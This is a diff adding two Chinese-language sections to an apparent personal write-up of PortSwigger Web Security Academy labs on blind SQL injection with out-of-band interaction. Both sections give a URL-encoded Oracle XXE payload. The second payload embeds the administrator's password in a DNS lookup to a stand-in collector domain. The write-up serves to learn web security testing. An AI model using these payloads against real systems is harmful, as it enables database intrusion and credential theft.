@@ -138,3 +138,14 @@
 4. 对密码进行爆破。
    + 在BurpSuite中爆破时，intruder monitor默认不会显示响应时间，在菜单栏`Columns`中将其打开。
 
+## 16: Blind SQL injection with out-of-band interaction
+
+使用Burp Collector请求一个域名，然后根据[Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)中的DNS lookup语句进行尝试，由于不确定后端，所以都试一遍就可以了，需要注意的是，里面许多字符在cookie中是保留的，例如`;`，我们需要将这些字符进行URL编码，最终payload为`' union select extractvalue(xmltype('<%3fxml version%3d"1.0" encoding%3d"UTF-8"%3f><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http%3a//collector.domain/"> %25remote%3b]>'),'/l') from dual--`。
+
+此外我这里尝试了堆叠注入而非联合注入，但是好像是失败了。
+
+## 17: Blind SQL injection with out-of-band data exfiltration
+
+> 在上一题的基础上请求密码并将其拼接进URL，这里需要注意加`.`使得密码作为子域名。另外注意单引号和双引号的严格使用，具体原因我也不太懂。
+
+`' union select extractvalue(xmltype('<%3fxml version%3d"1.0" encoding%3d"UTF-8"%3f><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM "http%3a//'||(select password from users where username%3d'administrator')||'.collector.domain/"> %25remote%3b]>'),'/l') from dual--`
